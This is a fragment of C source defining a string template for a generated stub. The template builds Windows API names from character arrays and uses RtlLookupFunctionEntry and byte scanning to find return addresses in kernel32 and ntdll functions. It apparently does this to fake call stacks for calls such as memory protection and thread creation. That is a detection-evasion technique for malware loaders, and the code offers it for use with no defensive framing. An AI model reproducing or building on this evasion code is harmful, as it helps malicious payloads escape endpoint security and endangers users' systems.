...
const char *g_StubTemplate =
    ...
    "n','t','r','y',0};\n"
    "    fnRtlLookupFunctionEntry RtlLookup = "
    "(fnRtlLookupFunctionEntry)GetProcAddress(hK32, sRtl);\n"
    "\n"
    "    DWORD scanLimit = 256; // fallback limit if .pdata lookup fails\n"
    "\n"
    "    if (RtlLookup) {\n"
    "        DWORD64 ImageBase;\n"
    "        PRUNTIME_FUNCTION pRF = RtlLookup((DWORD64)pBase, &ImageBase, "
    "NULL);\n"
    "        if (pRF) {\n"
    "            PVOID realBegin = (PVOID)(ImageBase + pRF->BeginAddress);\n"
    "            PVOID realEnd   = (PVOID)(ImageBase + pRF->EndAddress);\n"
    "            // Bytes from pBase to end of function, regardless of where "
    "BeginAddress is\n"
    ...
    "        if (i + 6 <= scanLimit && pBytes[i] == 0xFF && pBytes[i+1] == "
    "0x15)\n"
    ...
    "SeekReturnAddress(GetProcAddress(GetModuleHandleA(sK32), sVP));\n"
    "    Mask_Worker.pAddress = "
    "SeekReturnAddress(GetProcAddress(GetModuleHandleA(sK32), sCP));\n"
    "    Mask_Memory.pAddress = "
    "SeekReturnAddress(GetProcAddress(GetModuleHandleA(sK32), sMV));\n"
    "    Mask_File.pAddress = "
    "SeekReturnAddress(GetProcAddress(GetModuleHandleA(sK32), sMF));\n"
    "\n"
    "    qThreadBase = "
    "SeekReturnAddress((PVOID)((ULONG_PTR)GetProcAddress(GetModuleHandleA(sK32), sBT)));\n"
    "    qRtlUserThreadStart = "
    "SeekReturnAddress((PVOID)((ULONG_PTR)GetProcAddress(GetModuleHandleA(sNtdll), sRU)));\n"
